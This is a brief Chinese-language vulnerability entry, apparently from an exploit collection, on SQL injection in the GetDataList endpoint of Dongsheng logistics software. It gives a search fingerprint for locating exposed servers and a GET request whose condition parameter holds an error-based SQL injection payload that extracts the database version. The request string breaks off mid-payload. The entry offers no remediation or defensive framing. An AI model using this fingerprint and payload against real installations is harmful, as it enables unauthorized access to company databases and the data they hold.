# 东胜物流软件-GetDataList接口存在SQL注入漏洞

东胜物流软件-GetDataList接口 ｜ SQL注入 ｜ —
- **指纹**：`body="CompanysAdapter.aspx"`
- **请求**：`GET /TruckMng/MsWlDriver/GetDataList?_dc=1665626804091&start=0&limit=30&sort&condition=123+IN+(CHAR(113)%2bCHAR(120)%2bCHAR(112)%2bCHAR(113)%2bCHAR(113)%2bCHAR(32)%2b(select+%40%40version)%2bCHAR(32)%`